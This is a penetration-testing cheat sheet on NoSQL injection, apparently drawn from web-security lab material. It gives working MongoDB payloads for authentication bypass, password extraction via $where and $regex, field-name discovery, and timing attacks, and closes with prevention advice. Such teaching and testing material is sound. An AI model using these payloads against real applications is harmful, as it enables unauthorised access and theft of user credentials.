# NoSQL Injection - Cheat Sheet & Tips

This document provides practical tips for identifying, exploiting, and preventing NoSQL injection vulnerabilities.

## 1. What is NoSQL Injection?

NoSQL injection is a vulnerability where an attacker interferes with queries that an application makes to a NoSQL database. It may enable an attacker to:
- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.

## 2. Types of NoSQL Injection

| Attack Type | Description |
| :--- | :--- |
| **Syntax Injection** | Occurs when you can break the NoSQL query syntax to inject your own payload. Similar methodology to SQL injection but varies by database language. |
| **Operator Injection** | Occurs when you can use NoSQL query operators (like `$ne`, `$where`, `$regex`) to manipulate queries. |

## 3. How to Find NoSQL Vulnerabilities

- **Test systematically:** Submit fuzz strings and special characters that trigger database errors or behavior changes.
- **URL-based inputs:** Inject special characters via URL parameters.
- **JSON inputs:** Inject payloads as nested objects in JSON messages.
- **Adapt to the database:** Use special characters relevant to the target database (MongoDB, Cassandra, etc.).

## 4. Syntax Injection Detection

#### A. Fuzzing for Syntax Break

Submit a fuzz string to break the query syntax:

**MongoDB fuzz string:**
```txt
'"`{
;$Foo}
$Foo \xYZ
URL-encoded example:

http
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
If this causes a change from the original response, user input may not be properly filtered.

B. Identifying Processed Characters

Inject individual characters to see which break the syntax:

http
https://insecure-website.com/product/lookup?category='
If this changes the response, the ' character breaks the query syntax. Confirm by escaping it:

http
https://insecure-website.com/product/lookup?category=\'
C. Confirming Conditional Behavior

Send two requests with false and true conditions:

False condition:

http
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
True condition:

http
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
If the application behaves differently, the injection impacts the server-side query.

D. Overriding Conditions

Inject a condition that always evaluates to true:

http
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
Resulting MongoDB query:

javascript
this.category == 'fizzy'||'1'=='1'
This returns all items, including hidden or unreleased categories.

Null byte injection (ignores characters after null):

http
https://insecure-website.com/product/lookup?category=fizzy'%00
javascript
this.category == 'fizzy'\u0000' && this.released == 1
This removes the released restriction.

5. Operator Injection

A. Common MongoDB Operators

Operator	Description
$where	Matches documents satisfying a JavaScript expression.
$ne	Matches all values not equal to specified value.
$in	Matches values specified in an array.
$regex	Selects documents where values match a regex.
B. Submitting Query Operators

In JSON:

json
{"username":{"$ne":"invalid"}}
In URL parameters:

http
username[$ne]=invalid
Alternative if URL doesn't work:

Change method from GET to POST.
Change Content-Type to application/json.
Add JSON to body:
json
{"username":{"$ne":"invalid"}}
C. Bypassing Authentication

If both username and password accept operators:

json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
This logs you in as the first user in the collection.

Target a specific user:

json
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
6. Extracting Data via Syntax Injection

A. Using $where Operator

Example vulnerable query:

javascript
{"$where":"this.username == 'admin'"}
Extract password character by character:

javascript
admin' && this.password[0] == 'a' || 'a'=='b
Check if password contains digits:

javascript
admin' && this.password.match(/\d/) || 'a'=='b
B. Identifying Field Names

Test if a field exists:

http
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d
Compare with existing field:

http
admin' && this.username!=' admin' && this.foo!='
If response matches the existing field (username) but differs from non-existent field (foo), the field exists.

7. Extracting Data via Operator Injection

A. Injecting $where Operator

Add $where as an additional parameter and test with true/false conditions:

json
{"username":"wiener","password":"peter", "$where":"0"}
json
{"username":"wiener","password":"peter", "$where":"1"}
If responses differ, JavaScript in $where is being evaluated.

B. Extracting Field Names with keys()

json
{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
This inspects the first data field and returns the first character of the field name.

C. Using $regex Operator

Test if operator is processed:

json
{"username":"admin","password":{"$regex":"^.*"}}
If response differs from incorrect password, the application is vulnerable.

Extract data character by character:

json
{"username":"admin","password":{"$regex":"^a.*"}}
8. Timing-Based Injection

When errors don't cause response differences, use timing delays:

A. Establishing Baseline

Load the page several times to determine normal response time.

B. Timing Payloads

Using $where with JavaScript:

json
{"$where": "sleep(5000)"}
Check if password starts with 'a' using timing:

javascript
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
Alternative timing payload:

javascript
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
C. Identifying Successful Injection

If response loads more slowly, the injection was successful.

9. Prevention

The appropriate prevention depends on the specific NoSQL technology, but general guidelines include:

Sanitize and validate user input using an allowlist of accepted characters.
Use parameterized queries instead of concatenating user input directly into the query.
Apply an allowlist of accepted keys to prevent operator injection.
Disable or restrict JavaScript execution if not required by the application.
10. Testing Tips

Automated scanning: Use Burp Suite Scanner to detect NoSQL injection vulnerabilities.
Test everything: Don't forget URL parameters, POST bodies, JSON fields, and headers.
Adapt payloads: Adjust your payloads based on the database type and query context.
Use Burp extensions: The Content Type Converter extension can help convert requests to JSON format.
Dictionary attacks: Use wordlists to cycle through potential field names.
Best practice: Always test for both syntax injection and operator injection separately, as they require different exploitation techniques.
